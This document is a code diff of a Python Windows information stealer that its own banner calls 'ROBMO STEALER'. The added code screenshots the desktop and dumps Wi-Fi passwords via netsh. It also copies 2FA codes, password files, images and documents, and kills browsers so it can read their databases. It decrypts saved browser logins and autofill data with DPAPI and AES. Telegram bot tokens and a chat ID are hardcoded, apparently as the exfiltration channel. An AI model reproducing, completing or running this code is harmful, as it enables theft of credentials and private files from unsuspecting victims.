@@ -1,105 +1,40 @@
+import os, random, datetime, time, sqlite3, logging, shutil, requests
+import zipfile, json, psutil, pyzipper, platform, base64, getpass
+import pywifi, selenium, telegram, subprocess, xml.etree.ElementTree as ET
+import sounddevice as sd, numpy as np, ctypes
+import winreg as reg, threading, asyncio
 
-from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
-import time
-import logging
-import requests
-import os
-import time
-import datetime
-import requests
-import os
-import time
-import datetime
-import zipfile
-import asyncio
-import zipfile
-import asyncio
-import os
-import time
-import pyautogui
-import xml.etree.ElementTree as ET
-import os
-from datetime import datetime, timedelta
-from os import getenv, getlogin, listdir, walk
-import sqlite3
-import win32crypt
-import shutil
-import command
-import zipfile
-import random
-import threading
-import re
-import wmi
-import uuid
-import datetime
-import textwrap
-import psutil
-import glob
-import requests
-import sys
-import base64
-from base64 import b64decode
-from json import loads
-from regex import findall
-import platform
-import time
-import subprocess
-from pathlib import Path
-import codecs
-import json
-import base64
-from addict import Dict
-import win32crypt
-from Crypto.Cipher import AES
-from datetime import timezone, datetime, timedelta
-import winreg as reg
-from urllib.request import Request, urlopen
-import winreg
-from anonfile import AnonFile
-import getpass
-import os
-import sounddevice as sd
-import scipy.io.wavfile as wav
-import time
-import zipfile
-import win32clipboard
-import os
-import sounddevice as sd
-import scipy.io.wavfile as wav
-import time
-import base64
-import pywifi
-import json
-import os
-import shutil
-from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
-import sqlite3
-from datetime import datetime, timedelta
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
-from asyncio import *
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
-from json import loads
-from datetime import datetime, timedelta
-from email import encoders
-from email.mime.base import MIMEBase
-from json import loads as json_loads, load
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from multiprocessing import cpu_count
+from scipy.io import wavfile
 from PIL import ImageGrab
-from urllib.request import Request, urlopen
-from requests_toolbelt.multipart.encoder import MultipartEncoder
-from shutil import copy2
-from telegram import *
-from sys import executable
-from sqlite3 import connect as sql_connect
+from urllib.request import urlopen, Request
+from json import loads as json_loads, load
+from datetime import datetime
+from json import loads
+from pathlib import Path
+from Crypto.Cipher import AES
+from getpass import getuser
+from telegram import Bot
+from telegram import InputFile
 from win32crypt import CryptUnprotectData
-from zipfile import ZIP_DEFLATED, ZipFile
+from datetime import datetime, timedelta
 
+ma = {
+    'A': '𝐀', 'B': '𝐁', 'C': '𝐂', 'D': '𝐃', 'E': '𝐄', 'F': '𝐅', 'G': '𝐆', 'H': '𝐇', 'I': '𝐈', 'J': '𝐉', 'K': '𝐊', 
+    'L': '𝐋', 'M': '𝐌', 'N': '𝐍', 'Ñ': '𝐍̃', 'O': '𝐎', 'P': '𝐏', 'Q': '𝐐', 'R': '𝐑', 'S': '𝐒', 'T': '𝐓', 'U': '𝐔', 
+    'V': '𝐕', 'W': '𝐖', 'X': '𝐗', 'Y': '𝐘', 'Z': '𝐙',
+}
+
+mi = {
+    'a': '𝐚', 'b': '𝐛', 'c': '𝐜', 'd': '𝐝', 'e': '𝐞', 'f': '𝐟', 'g': '𝐠', 'h': '𝐡', 'i': '𝐢', 'j': '𝐣',
+    'k': '𝐤', 'l': '𝐥', 'm': '𝐦', 'n': '𝐧', 'ñ': '𝐧̃','o': '𝐨', 'p': '𝐩', 'q': '𝐪', 'r': '𝐫', 's': '𝐬',
+    't': '𝐭', 'u': '𝐮', 'v': '𝐯', 'w': '𝐰', 'x': '𝐱','y': '𝐲', 'z': '𝐳',
+}
+
+
+num = {
+    '1': '𝟏', '2': '𝟐', '3': '𝟑', '4': '𝟒', '5': '𝟓',
+    '6': '𝟔', '7': '𝟕', '8': '𝟖', '9': '𝟗', '0': '𝟎',
+}
 
 i = '''
 ╔═══════════════════════════════════════════════╗
@@ -113,61 +48,96 @@ i = '''
    
 ╚═══════════════════════════════════════════════╝
 '''
+
 r = '''
 ═════════════════ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ═════════════════
 '''
+
 user = os.path.expanduser("~")
+
 username = os.getenv("USERNAME")
-a = " ➤ "
+
+u_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")
+
+arrow = " ➤ "
+
 s = "\n"
+
+USERTLG = 123456
+ID = -1001933102780  
+BOT1 = "6650505242:AAG5p1dKgEtWRG8uLOjOnzmbg8i6CD0NLoU"
+BOT2 = "5653063371:AAFr_yg-viVlckax0Lik-Mnx1RBvY0LYdJw"
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 
-user_tlg = 1234567890
+def enable_show_hidden_files():
+    try:
+        registry_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+        key_name = "Hidden"
 
-#screenshots
+        with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_path, 0, reg.KEY_SET_VALUE) as key:
+            reg.SetValueEx(key, key_name, 0, reg.REG_DWORD, 1)
 
-def screenshots(interval, num_screenshots, output_folder):
-    screenshots_folder = os.path.join(output_folder, "𝐒𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭𝐬")
-    if not os.path.exists(screenshots_folder):
-        os.makedirs(screenshots_folder)
-    for i in range(num_screenshots):
+    except Exception as e:
+        pass
+    
+enable_show_hidden_files()
+
+def screenshot(interval, num_s, o_folder):
+    s_folder = os.path.join(o_folder, "𝐒𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭𝐬")
+    if not os.path.exists(s_folder):
+        os.makedirs(s_folder)
+    for i in range(num_s):
         screenshot = ImageGrab.grab()
         timestamp = time.strftime("[%d][%M][%S]")
         filename = f"𝐒𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭{timestamp}.png"
-        screenshot_path = os.path.join(screenshots_folder, filename)
+        screenshot_path = os.path.join(s_folder, filename)
         screenshot.save(screenshot_path)
         time.sleep(interval)
-user = os.getlogin()
-user_folder = os.path.join(f"C:\\Users\\{user}", "𝐔𝐬𝐞𝐫")
-screenshots(interval=2, num_screenshots=5, output_folder=user_folder)
+        
+screenshot(interval=1, num_s=3, o_folder=u_folder)
 
-#wifi 
+def convertir_nombre(name):
+    result1 = ''
+    for letter in name:
+        if letter in ma:
+            result1 += ma[letter]
+        elif letter in mi:
+            result1 += mi[letter]
+        elif letter in num:
+            result1 += num[letter]
+        else:
+            result1 += letter
+    return result1
 
-def create_wifi_folder(user_folder):
-    wifi_folder = os.path.join(user_folder, "𝐖𝐢-𝐟𝐢")
-    if not os.path.exists(wifi_folder):
-        os.makedirs(wifi_folder)
-    return wifi_folder
-def export_wifi_profiles(wifi_folder):
+def w_folder(u_folder):
+    w_folder = os.path.join(u_folder, "𝐖𝐢-𝐟𝐢")
+    if not os.path.exists(w_folder):
+        os.makedirs(w_folder)
+    return w_folder
+
+def export_w(w_folder):
     try:
-        output_file = os.path.join(wifi_folder, "output.txt")
-        with open(output_file, "w") as output:
-            subprocess.run(["netsh", "wlan", "export", "profile", "key=clear", "folder=" + wifi_folder], stdout=output, stderr=output, check=True)
+        o_file = os.path.join(w_folder, "output.txt")
+        with open(o_file, "w") as output:
+            subprocess.run(["netsh", "wlan", "export", "profile", "key=clear", "folder=" + w_folder], stdout=output, stderr=output, check=True)
         return True
     except subprocess.CalledProcessError:
         return False
-user_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")
-wifi_folder = create_wifi_folder(user_folder)
-result = export_wifi_profiles(wifi_folder)
+
+w_folder = w_folder(u_folder)
+result = export_w(w_folder)
+
 if result:
-    os.remove(os.path.join(wifi_folder, "output.txt"))
-folder_path = r'C:\Users\{user}\𝐔𝐬𝐞𝐫\𝐖𝐢-𝐟𝐢'.format(user=os.getlogin())
-if not os.path.exists(folder_path):
+    os.remove(os.path.join(w_folder, "output.txt"))
+    
+w_path = r'C:\Users\{user}\𝐔𝐬𝐞𝐫\𝐖𝐢-𝐟𝐢'.format(user=os.getlogin())
+if not os.path.exists(w_path):
     exit()
-for filename in os.listdir(folder_path):
+
+for filename in os.listdir(w_path):
     if filename.endswith(".xml"):
-        file_path = os.path.join(folder_path, filename)
+        file_path = os.path.join(w_path, filename)
         tree = ET.parse(file_path)
         root = tree.getroot()
         profile_name = "N/A"
@@ -182,59 +152,37 @@ for filename in os.listdir(folder_path):
             elif "keyType" in elem.tag:
                 key_type = elem.text if elem.text else "N/A"
             elif "keyMaterial" in elem.tag:
-                key_material = elem.text if elem.text else "N/A"
-        output_filename = os.path.splitext(filename)[0] + ".txt"
-        output_path = os.path.join(folder_path, output_filename)
-        with open(output_path, 'w', encoding="utf-8") as output_file:
-            output_file.write(i)
-            output_file.write(r)
-            output_file.write(s)
-            output_file.write(f"𝐍𝐚𝐦𝐞: {profile_name}\n")
-            output_file.write(r)
-            output_file.write(s)
-            output_file.write(f"𝐀𝐮𝐭𝐡𝐞𝐧𝐭𝐢𝐜𝐚𝐭𝐢𝐨𝐧: {authentication}\n")
-            output_file.write(r)
-            output_file.write(s)
-            output_file.write(f"𝐊𝐞𝐲𝐓𝐲𝐩𝐞: {key_type}\n")
-            output_file.write(r)
-            output_file.write(s)
-            output_file.write(f"𝐊𝐞𝐲: {key_material}\n")
-            output_file.write(r)
-            output_file.write(s)
-def delete_xml_files(folder_path):
-    for filename in os.listdir(folder_path):
+                key_material = elem.text if elem.text else "N/A"    
+        converted_name = convertir_nombre(profile_name)
+        o_filename = os.path.splitext(filename)[0] + ".txt"
+        output_path = os.path.join(w_path, converted_name + ".txt")
+        if not os.path.exists(output_path):
+            os.rename(file_path, output_path)
+            with open(output_path, 'w', encoding="utf-8") as o_file:
+                o_file.write(i)
+                o_file.write(s)
+                o_file.write(r)
+                o_file.write(s)
+                o_file.write(f"➤  𝐍𝐚𝐦𝐞: {profile_name}\n")
+                o_file.write(r)
+                o_file.write(s)
+                o_file.write(f"➤  𝐀𝐮𝐭𝐡𝐞𝐧𝐭𝐢𝐜𝐚𝐭𝐢𝐨𝐧: {authentication}\n")
+                o_file.write(r)
+                o_file.write(s)
+                o_file.write(f"➤  𝐊𝐞𝐲𝐓𝐲𝐩𝐞: {key_type}\n")
+                o_file.write(r)
+                o_file.write(s)
+                o_file.write(f"➤  𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: {key_material}\n")
+                o_file.write(r)
+                o_file.write(s)
+
+def delete(folder_p):
+    for filename in os.listdir(folder_p):
         if filename.endswith(".xml"):
-            file_path = os.path.join(folder_path, filename)
+            file_path = os.path.join(folder_p, filename)
             os.remove(file_path)
-delete_xml_files(wifi_folder)
 
-#audio
-
-def audio(dur, folder, am=5):
-    fs = 48000  
-    recording = sd.rec(int(fs * dur), samplerate=fs, channels=2, dtype='int32')  
-    sd.wait()
-    amplified_recording = recording * am
-    user = os.getlogin()
-    dir = os.path.join(os.path.expanduser(f'C:\\Users\\{user}\\𝐔𝐬𝐞𝐫\\{folder}'))
-    if not os.path.exists(dir):
-        os.makedirs(dir)
-    des = os.path.join(dir, f'𝐑𝐨𝐛𝐦𝐨{time.strftime("[%d][%S]")}.wav')
-    wav.write(des, fs, amplified_recording.astype('int32'))
-    return des
-def Robmo():
-    num = 3
-    dura = 10
-    timed = 2
-    folder = '𝐀𝐮𝐝𝐢𝐨'
-    for i in range(num):
-        arch = audio(dura, folder, am=5)
-
-        if i < num - 1:
-            time.sleep(timed)
-Robmo()
-
-#PC INFO
+delete(w_folder)
 
 def systeminfo():
     computer_name = os.getenv('COMPUTERNAME')
@@ -242,9 +190,11 @@ def systeminfo():
     total_memory_gb = round(psutil.virtual_memory().total / (1024 ** 3), 2)
     cpu_info = platform.processor()
     system_type = platform.architecture()[0]
-    system_info = f"\n➤ 𝐂𝐨𝐦𝐩𝐮𝐭𝐞𝐫 𝐍𝐚𝐦𝐞: {computer_name}\n➤ 𝐎𝐒: {os_version}\n➤ 𝐓𝐨𝐭𝐚𝐥 𝐌𝐞𝐦𝐨𝐫𝐲: {total_memory_gb} 𝐆𝐁\n➤ 𝐂𝐏𝐔: {cpu_info}\n➤ 𝐒𝐲𝐬𝐭𝐞𝐦 𝐓𝐲𝐩𝐞: {system_type}"
+    system_info = f"➤ 𝐂𝐨𝐦𝐩𝐮𝐭𝐞𝐫 𝐍𝐚𝐦𝐞: {computer_name}\n➤ 𝐎𝐒: {os_version}\n➤ 𝐓𝐨𝐭𝐚𝐥 𝐌𝐞𝐦𝐨𝐫𝐲: {total_memory_gb} 𝐆𝐁\n➤ 𝐂𝐏𝐔: {cpu_info}\n➤ 𝐒𝐲𝐬𝐭𝐞𝐦 𝐓𝐲𝐩𝐞: {system_type}"
     return system_info
+
 def guardar():
+    
     user = os.getlogin()
     user_folder = os.path.join(f"C:\\Users\\{user}", "𝐔𝐬𝐞𝐫")
     pc_info_folder = os.path.join(user_folder, "𝐏𝐜 𝐈𝐧𝐟𝐨")  
@@ -253,6 +203,7 @@ def guardar():
     file_path = os.path.join(pc_info_folder, "𝐒𝐲𝐬𝐭𝐞𝐦 𝐈𝐧𝐟𝐨.txt") 
     with open(file_path, "w", encoding="utf-8") as file:
         file.write(i.strip() + s + s + systeminfo())
+        
 guardar()
 
 def netuser():
@@ -264,74 +215,68 @@ def save(content, file_p):
         file.write(i)
         file.write(s)
         file.write(content)
+        
 nt = netuser()
 folder_path = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫", "𝐏𝐜 𝐈𝐧𝐟𝐨")
 if not os.path.exists(folder_path):
     os.makedirs(folder_path)
 file_p = os.path.join(folder_path, "𝐔𝐬𝐞𝐫𝐬.txt")
+
 save("\n".join(nt), file_p)
 
-#IP
-        
 def getip():
     ip = "None"
-    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()    
+    try:
+        ip = urlopen("https://api.ipify.org", timeout=10).read().decode().strip()
+    except Exception as e:
+        pass
     return ip
 
 def info():
     ip = getip()
-    ipjson = urlopen(Request(f"https://ipinfo.io/json")).read().decode().replace('callback(', '').replace('})', '}')
-    ipdata = loads(ipjson)
-    city = ipdata["city"]
-    region = ipdata["region"]
-    country = ipdata["country"]
-    timezone = ipdata["timezone"]
-    org = ipdata["org"]
-    loc = ipdata["loc"]
+    city, region, country, timezone, org, loc = "None", "None", "None", "None", "None", "None"
+    try:
+        ipjson = urlopen("https://ipinfo.io/json", timeout=10).read().decode().replace('callback(', '').replace('})', '}')
+        ipdata = loads(ipjson)
+        city = ipdata["city"]
+        region = ipdata["region"]
+        country = ipdata["country"]
+        timezone = ipdata["timezone"]
+        org = ipdata["org"]
+        loc = ipdata["loc"]
+    except Exception as e:
+        pass
+    
     now = datetime.now()
     date = now.strftime("%d-%m-%y")
     time = now.strftime("%H:%M:%S") 
     info = f"\n➤  𝐔𝐬𝐞𝐫: {username}\n➤  𝐈𝐏: {ip}\n➤  𝐂𝐢𝐭𝐲: {city}\n➤  𝐑𝐞𝐠𝐢𝐨𝐧: {region}\n➤  𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n➤  𝐓𝐢𝐦𝐞𝐳𝐨𝐧𝐞: {timezone}\n➤  𝐎𝐫𝐠: {org}\n➤  𝐋𝐨𝐜: {loc}\n➤  𝐃𝐚𝐭𝐞: {date}\n➤  𝐓𝐢𝐦𝐞: {time}"
+    
     return info
+
 def ginfo():
     user_info = info()
     zz = "𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨:"
-    if not os.path.exists(user_folder):
-        os.makedirs(user_folder)
-    file_path = os.path.join(user_folder, "𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨.txt")
+    if not os.path.exists(u_folder):
+        os.makedirs(u_folder)
+    file_path = os.path.join(u_folder, "𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨.txt")
     with open(file_path, "w", encoding="utf-8") as file:
         file.write(i.strip() + s + s + zz + s + user_info)
+
 ginfo()
 
-#ipconfig
-
-def ipconfig():
-    result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, check=True)
-    return result.stdout
-def save_to_file(content, file_path):
-    with open(file_path, 'w', encoding='utf-8') as file:
-        file.write(i)
-        file.write(s)
-        file.write(content)
-mac_info = ipconfig()
-folder_path = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫", "𝐏𝐜 𝐈𝐧𝐟𝐨")
-if not os.path.exists(folder_path):
-    os.makedirs(folder_path)
-file_path = os.path.join(folder_path, "𝐈𝐏.txt")
-save_to_file(mac_info, file_path)
-
-#2FA CODES
-
-def search_files_in_folders(folders, file_names):
+def filesf(folders, names, extension=".txt"):
     found_files = []
 
     for folder in folders:
         for root, dirs, files in os.walk(folder):
             for file in files:
-                if any(name.lower() in file.lower() for name in file_names):
+                if any(name.lower() in file.lower() for name in names) and file.lower().endswith(extension):
                     file_path = os.path.join(root, file)
                     found_files.append((file, file_path))
+                    
     return found_files
+
 def copy_files_to_destination(files, destination_folder):
     if not os.path.exists(destination_folder):
         os.makedirs(destination_folder)
@@ -339,7 +284,7 @@ def copy_files_to_destination(files, destination_folder):
     for file, source_path in files:
         destination_path = os.path.join(destination_folder, file)
         shutil.copy2(source_path, destination_path)
-user = os.path.expanduser("~")
+
 folders_to_search = [
     os.path.join(user, "Downloads"), 
     os.path.join(user, "OneDrive", "Documents"),
@@ -351,30 +296,118 @@ folders_to_search = [
     os.path.join(user, "Deskstop"),
     os.path.join(user, "Escritorio"),
 ]
-file_names_to_search = {"2fa", "backup", "two", "factor", "codes"}
-username = os.getenv("USERNAME")
-user_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")
-found_files = search_files_in_folders(folders_to_search, file_names_to_search)
+
+file_search = {"2fa", "backup", "two", "factor", "codes", "code", "passwords"}
+
+found_files = filesf(folders_to_search, file_search)
 if found_files:
-    destination_folder = os.path.join(user_folder, "𝐅𝐢𝐥𝐞𝐬", "𝟐𝐅𝐀")
+    destination_folder = os.path.join(u_folder, "𝐅𝐢𝐥𝐞𝐬", "𝟐𝐅𝐀")
     copy_files_to_destination(found_files, destination_folder)
 else:
     pass
 
-#FILES 
+folders_to_search = [
+    os.path.join(user, "Downloads"), 
+    os.path.join(user, "OneDrive", "Documents"),
+    os.path.join(user, "Documents"), 
+    os.path.join(user, "OneDrive", "Documentos"),
+    os.path.join(user, "Documentos"), 
+    os.path.join(user, "OneDrive", "Escritorio"),
+    os.path.join(user, "OneDrive", "Deskstop"),
+    os.path.join(user, "Deskstop"),
+    os.path.join(user, "Escritorio"),
+    os.path.join(user, "Downloads")
+]
 
+u_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")
+destination = os.path.join(u_folder, "𝐅𝐢𝐥𝐞𝐬", "𝐏𝐢𝐜𝐭𝐮𝐫𝐞𝐬")
 
+Path(destination).mkdir(parents=True, exist_ok=True)
 
-# BROWSERS
+txt_file_path = os.path.join(destination, "𝐅𝐢𝐥𝐞𝐬.txt")
 
-   
+with open(txt_file_path, "w", encoding='utf-8') as txt_file:
+    txt_file.write(f"{i}\n\n")
+
+    for folder in folders_to_search:
+        for root, dirs, files in os.walk(folder):
+            for file in files:
+                if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
+                    source_path = os.path.join(root, file)
+                    destination_path = os.path.join(destination, file)
+                    
+                    shutil.copy2(source_path, destination_path)
+                    
+                    txt_file.write(f"𝐅𝐢𝐥𝐞: {file}\n")
+                    txt_file.write(f"𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧: {source_path}\n")
+                    txt_file.write(f"{r}")
+                    txt_file.write("\n")
+
+folders_to_search = [
+    os.path.join(user, "Downloads"), 
+    os.path.join(user, "OneDrive", "Documents"),
+    os.path.join(user, "Documents"), 
+    os.path.join(user, "OneDrive", "Documentos"),
+    os.path.join(user, "Documentos"), 
+    os.path.join(user, "OneDrive", "Escritorio"),
+    os.path.join(user, "OneDrive", "Deskstop"),
+    os.path.join(user, "Deskstop"),
+    os.path.join(user, "Escritorio"),
+    os.path.join(user, "Downloads")
+]
+
+destination = os.path.join(u_folder, "𝐅𝐢𝐥𝐞𝐬", "𝐃𝐨𝐜𝐮𝐦𝐞𝐧𝐭𝐬")
+
+Path(destination).mkdir(parents=True, exist_ok=True)
+
+txt_file_path = os.path.join(destination, "𝐅𝐢𝐥𝐞𝐬.txt")
+
+with open(txt_file_path, "w", encoding='utf-8') as txt_file:
+    txt_file.write(f"{i}\n\n")
+
+    for folder in folders_to_search:
+        for root, dirs, files in os.walk(folder):
+            for file in files:
+                if file.lower().endswith(('.docx', '.xlsx', '.pptx', '.pdf', '.csv')):
+                    source_path = os.path.join(root, file)
+                    destination_path = os.path.join(destination, file)
+                    
+                    shutil.copy2(source_path, destination_path)
+                    
+                    txt_file.write(f"➤  𝐅𝐢𝐥𝐞: {file}\n")
+                    txt_file.write(f"➤  𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧: {source_path}\n")
+                    txt_file.write(f"{r}")
+                    txt_file.write("\n")
+
+def cerrar_navegadores():
+    navegadores = ["chrome", "firefox", "msedge", "iexplore", "opera", "operagx"]
+
+    try:
+        for navegador in navegadores:
+            for proceso in psutil.process_iter(['pid', 'name']):
+                if proceso.info['name'] and navegador.lower() in proceso.info['name'].lower():
+                    pid = proceso.info['pid']
+                    proceso = psutil.Process(pid)
+                    proceso.terminate()
+    except Exception as e:
+        pass
+
+def bloquear_navegadores(tiempo_bloqueo=10):
+    tiempo_inicial = time.time()
+
+    while time.time() - tiempo_inicial < tiempo_bloqueo:
+        cerrar_navegadores()
+        time.sleep(2)  
+
+bloquear_navegadores()
+ 
 def browser_txt(user_folder, browser_list):
     browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬")
     if not os.path.exists(browser):
         os.makedirs(browser)
     browser_txt = os.path.join(browser, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬.txt")
     installed_browsers = [
-        f"➤ 𝐍𝐚𝐦𝐞: {name} {s}➤ 𝐏𝐚𝐭𝐡: {path} {s}{s}{r}{s}" for name, path in browser_list.items() if os.path.exists(path)
+        f"➤ 𝐍𝐚𝐦𝐞: {name} {s}➤ 𝐏𝐚𝐭𝐡: {path} {s}{r}" for name, path in browser_list.items() if os.path.exists(path)
     ]
     if installed_browsers:
         with open(browser_txt, "w", encoding="utf-8") as file:
@@ -394,6 +427,7 @@ browsers = {
     '𝐎𝐫𝐛𝐢𝐭𝐮𝐦': local + '\\Orbitum\\User Data',
     '𝐂𝐞𝐧𝐭𝐁𝐫𝐨𝐰𝐬𝐞𝐫': local + '\\CentBrowser\\User Data',
     '𝐒𝐩𝐮𝐭𝐧𝐢𝐤': local + '\\Sputnik\\Sputnik\\User Data',
+    '𝐅𝐢𝐫𝐞𝐟𝐨𝐱': roaming + '\\Mozilla\\Firefox\\Profiles\\',
     '𝐕𝐢𝐯𝐚𝐥𝐝𝐢': local + '\\Vivaldi\\User Data',
     '𝐆𝐨𝐨𝐠𝐥𝐞-𝐂𝐡𝐫𝐨𝐦𝐞-𝐒𝐱𝐒': local + '\\Google\\Chrome SxS\\User Data', 
     '𝐄𝐩𝐢𝐜-𝐏𝐫𝐢𝐯𝐚𝐜𝐲-𝐁𝐫𝐨𝐰𝐬𝐞𝐫': local + '\\Epic Privacy Browser',
@@ -403,8 +437,8 @@ browsers = {
     '𝐎𝐩𝐞𝐫𝐚 𝐆𝐗': roaming + '\\Opera Software\\Opera GX Stable',
 }
 
-browser_txt(user_folder, browsers)
-    
+browser_txt(u_folder, browsers)
+
 data_queries = {
     '𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬': {
         'query': 'SELECT origin_url, username_value, password_value FROM logins',
@@ -458,6 +492,8 @@ def decrypt_password(buff: bytes, key: bytes) -> str:
 
     return decrypted_pass
 
+bloquear_navegadores()
+
 def save_results(browser_name, type_of_data, content):
     user = os.path.expanduser("~")
     user_folder = os.path.join(user, "𝐔𝐬𝐞𝐫")
@@ -494,6 +530,8 @@ def get_data(path: str, profile: str, key, type_of_data):
     conn.close()
     os.remove('temp_db')
     return result
+
+bloquear_navegadores()
 
 def convert_chrome_time(chrome_time):
     return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
@@ -543,7 +581,7 @@ def get_autofill_data(browser_path):
             for item in cursor.fetchall():
                 name = item[0]
                 value = item[1]
-                autofill_data += f"⮞ {name}: {value}\n{r}\n"
+                autofill_data += f"⮞ {name}: {value}\n\n{r}\n\n"
 
         except sqlite3.Error:
             pass
@@ -553,7 +591,7 @@ def get_autofill_data(browser_path):
 
         if autofill_data:
             with open(os.path.join(output_folder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥.txt'), 'w', encoding='utf-8') as f:
-                f.write(i + s + r + s)
+                f.write(i + s + r + s + s)
                 f.write(autofill_data)
     except Exception as e:
         pass
@@ -561,7 +599,7 @@ def get_autofill_data(browser_path):
 for browser_name, browser_path in chrome.items():
     get_autofill_data(browser_path)
     
-
+bloquear_navegadores()
 
 opera = {
     '𝐎𝐩𝐞𝐫𝐚': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable")
@@ -590,7 +628,7 @@ def get_autofill_data(browser_path):
             for item in cursor.fetchall():
                 name = item[0]
                 value = item[1]
-                autofill_data += f"⮞ {name}: {value}\n{r}\n"
+                autofill_data += f"⮞ {name}: {value}\n\n{r}\n\n"
 
         except sqlite3.Error:
             pass
@@ -600,7 +638,7 @@ def get_autofill_data(browser_path):
 
         if autofill_data:
             with open(os.path.join(output_folder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥.txt'), 'w', encoding='utf-8') as f:
-                f.write(i + s + r + s)
+                f.write(i + s + r + s + s)
                 f.write(autofill_data)
     except Exception as e:
         pass
@@ -608,84 +646,8 @@ def get_autofill_data(browser_path):
 for browser_name, browser_path in opera.items():
     get_autofill_data(browser_path)
     
+bloquear_navegadores()
 
-def get_makey(path: str):
-    if not os.path.exists(path):
-        return None
-
-    with open(path + "\\Local State", "r", encoding="utf-8") as f:
-        local_state = json.load(f)
-
-    encrypted_key = local_state["os_crypt"]["encrypted_key"]
-    encrypted_key = base64.b64decode(encrypted_key)
-    encrypted_key = encrypted_key[5:]
-
-    try:
-        decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        return decrypted_key
-    except Exception as e:
-        print(f"Error decrypting key: {str(e)}")
-        return None
-
-def decrypt_password(buff, master_key):
-    iv = buff[3:15]
-    payload = buff[15:]
-    cipher = AES.new(master_key, AES.MODE_GCM, iv)
-    decrypted_pass = cipher.decrypt(payload)
-    decrypted_pass = decrypted_pass[:-16].decode()
-    return decrypted_pass
-
-def get_saved_passwords(browser_profile_path, master_key):
-    login_data = os.path.join(browser_profile_path, 'Login Data')
-    shutil.copy2(login_data, "LoginData.db")  
-
-    conn = sqlite3.connect("LoginData.db")
-    cursor = conn.cursor()
-
-    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-    login_data = cursor.fetchall()
-
-    decrypted_passwords = []
-    for data in login_data:
-        url, username, password = data
-        password = decrypt_password(password, master_key)
-        decrypted_passwords.append((url, username, password))
-
-    conn.close()
-    os.remove("LoginData.db")
-
-    return decrypted_passwords
-
-def save_passwords_to_file(passwords, output_path, i):
-    with open(output_path, "w", encoding="utf-8") as f:
-        f.write(i + r + "\n")
-        for url, username, password in passwords:
-            f.write(f"URL: {url}\n")
-            f.write(f"Username: {username}\n")
-            f.write(f"Password: {password}")
-            f.write(r + "\n\n")
-
-def opera1():
-    user = os.path.expanduser("~")
-    
-    profile_path = os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera Stable")
-    
-    opera_folder = os.path.join(user, "𝐔𝐬𝐞𝐫\\𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬\\𝐎𝐩𝐞𝐫𝐚")
-    if not os.path.exists(opera_folder):
-        os.makedirs(opera_folder, exist_ok=True)
-    
-    master_key = get_makey(profile_path)
-
-    if master_key:
-        saved_passwords = get_saved_passwords(profile_path, master_key)
-        if saved_passwords:
-            output_path = os.path.join(opera_folder, "𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬_𝐎.txt")  
-            save_passwords_to_file(saved_passwords, output_path, i)
-        
-
-opera1()
-
-    
 edge = {
     '𝐄𝐝𝐠𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
 }
@@ -713,74 +675,86 @@ def get_auto_data(browserpath):
             for item in cursor.fetchall():
                 name = item[0]
                 value = item[1]
-                autofill_data += f"⮞ {name}: {value}\n{r}\n"
+                autofill_data += f"⮞ {name}: {value}\n\n{r}\n\n"
 
         except sqlite3.Error:
             pass
 
         conn.close()
         os.remove(web_data_db_copy)
+
         if autofill_data:
             with open(os.path.join(outputfolder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥.txt'), 'w', encoding='utf-8') as f:
-                f.write(i + s + r + s)
+                f.write(i + s + r + s + s)
                 f.write(autofill_data)
     except Exception as e:
         pass
+    
 for browser_name, browserpath in edge.items():
     get_auto_data(browserpath)
-    
+
 operagx = {
     '𝐎𝐩𝐞𝐫𝐚 𝐆𝐗': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
 }
+
 output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐎𝐩𝐞𝐫𝐚 𝐆𝐗")
+
 def create_directory_if_not_exists(directory):
     if not os.path.exists(directory):
         os.makedirs(directory)
+
